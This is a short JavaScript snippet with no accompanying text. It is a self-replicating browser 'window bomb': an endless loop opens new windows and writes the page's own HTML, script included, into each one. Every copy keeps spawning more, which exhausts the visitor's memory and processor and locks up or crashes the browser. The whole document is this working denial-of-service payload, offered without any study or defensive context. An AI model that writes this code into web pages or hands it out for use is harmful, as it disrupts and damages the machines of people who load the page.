while (true) {
    var w = window.open();
    w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
}
